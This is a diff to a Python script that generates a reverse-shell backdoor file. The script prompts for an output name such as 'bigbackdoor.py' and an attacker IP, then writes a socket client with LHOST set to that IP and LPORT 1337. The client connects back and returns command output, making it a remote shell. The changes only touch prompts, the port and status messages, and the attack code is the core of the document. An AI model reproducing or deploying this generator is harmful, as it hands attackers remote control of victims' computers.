@@ -1,11 +1,14 @@
 
+from src.message import success, error, warn
 
 def pyload():
-    print("[*] Insert a file name.py")
+    file_name = input("[?] Insert a file name (example: bigbackdoor.py): ")
+    ip = input("[?] Insert your IP: ")
+
     arq = open(file_name, 'w')
-    finish()
+
     temp = """
-# Backdoor coded by: Gr3n0xX
+# Backdoor by: Gr3n0xX
 # Python 3.9
 
 import socket
@@ -14,7 +17,7 @@ import os
 import sys
 
 LHOST = '""" + ip + """' 
-LPORT = 8080
+LPORT = 1337
 client = socket.socket()
 print("[-] Connection Initiating...")
 
@@ -53,21 +56,11 @@ while True:
     client.send(output + output_error)
     """
     arq.write(temp + "\n")
+    finish(ip)
 
-def finish():
-    print ("[*] Generating...")
-    os.system("clear")
-    print ("1%")
-    time.sleep(1.9)
-    os.system("clear")
-    print ("15%")
-    time.sleep(1.9)
-    os.system("clear")
-    print ("30%")
-    time.sleep(1.9)
-    os.system("clear")
-    print ("50%")
-    time.sleep(1.9)
-    os.system("clear")
-    print ("100%")
-    time.sleep(3)
+def finish(ip):
+    warn("Generating, please wait...\n")
+    
+    success("Finished backdoor.")
+    success(f"Backdoor IP: {ip} - Backdoor Port: 1337")
+
